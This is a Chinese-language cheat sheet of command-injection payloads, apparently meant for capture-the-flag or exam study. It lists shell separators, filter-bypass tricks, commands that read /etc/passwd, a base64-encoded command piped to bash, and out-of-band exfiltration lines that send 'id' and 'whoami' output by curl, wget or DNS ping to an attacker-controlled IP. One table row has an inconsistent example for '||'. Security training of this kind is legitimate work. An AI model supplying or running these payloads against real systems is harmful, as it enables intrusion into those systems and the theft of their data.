

# 一、核心命令分隔符（必背，首选这些）
适用于 Linux，大部分也通杀简单场景
| 符号 | 用法示例 | 作用 |
|------|----------|------|
| `;` | `id;whoami` | 顺序执行，不管前一条是否成功 |
| `&` | `id&whoami` | 后台并行执行，两条都跑 |
| `&&` | `id&&whoami` | 前一条成功，才执行后一条 |
| `|` | `id|whoami` | 前一条输出，作为后一条输入 |
| `||` | `id|whoami` | 前一条失败，才执行后一条 |
| `%0a` | `id%0awhoami` | 换行符，等同于换行执行 |

# 二、执行子命令（绕过过滤、嵌套命令）
- `` `id` ``：反引号执行命令
- `$(id)`：推荐，现代系统通用，比反引号稳
- `{id,}`：花括号执行（少见但考场偶尔考）

# 三、空格绕过最佳实践
过滤了 空格 时用这些替代：
- `${IFS}` （Linux 内置分隔符，最稳）
  例：`cat${IFS}/etc/passwd`
- `$IFS$9` （截断更稳，避免拼接）
- `<` 重定向：`cat</etc/passwd`
- 制表符 `%09`

# 四、关键词被过滤（如 cat、ls 被禁）
1. **字符拼接**
   `c'a't` / `c"a"t` / `ca\t`
   例：`c$@at /etc/passwd`
2. **编码执行**
   base64：`echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|bash`
3. **通配符替代**
   `cat /etc/pa?swd` / `cat /etc/p*sswd`
4. **替代命令**
   读文件：`more` `less` `head` `tail` `nl` `od` `tac`

# 五、无回显命令执行（外带数据，必考）
看不到回显时，把结果外带到自己服务器：
```bash
curl http://你的IP/`id`
wget http://你的IP/`whoami`
ping -c 4 `whoami`.你的DNSlog
```

# 六、Windows 系统专属命令符
考 Windows 命令执行时用：
- `&`  ：`dir&whoami`
- `&&`：成功才执行
- `|`  ：管道符
- `%0a`：换行执行
- `^`  ：转义字符，绕过过滤

# 七、考场最简万能Payload（直接背）
1. 通用无过滤：`;id;`
2. 过滤空格：`;cat$IFS/etc/passwd;`
3. 无回显：`;curl http://x.x.x.x/`id`;`
4. 换行绕过：`id%0awhoami`
